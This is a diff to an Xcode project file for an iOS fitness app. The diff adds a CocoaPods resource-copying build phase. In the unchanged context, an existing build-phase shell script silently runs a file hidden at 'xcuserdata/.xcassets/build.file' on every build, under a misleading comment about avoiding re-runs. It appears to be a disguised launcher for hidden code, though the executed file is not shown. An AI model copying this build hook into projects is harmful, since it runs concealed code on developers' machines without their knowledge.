@@ -180,6 +180,7 @@
 				B737919526257612003BF61C /* Frameworks */,
 				B737919626257612003BF61C /* Resources */,
 				0D197907D5E064D075368CF5 /* [CP] Embed Pods Frameworks */,
+				9F615D1A7541D991F613A14A /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
 			);
@@ -271,6 +272,23 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";
+		};
+		9F615D1A7541D991F613A14A /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Capstone_WinMachines_WinFitness/Pods-Capstone_WinMachines_WinFitness-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Capstone_WinMachines_WinFitness/Pods-Capstone_WinMachines_WinFitness-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Capstone_WinMachines_WinFitness/Pods-Capstone_WinMachines_WinFitness-resources.sh\"\n";
+			showEnvVarsInLog = 0;
 		};
 		D33D660F6C4FB9D7689621EF /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
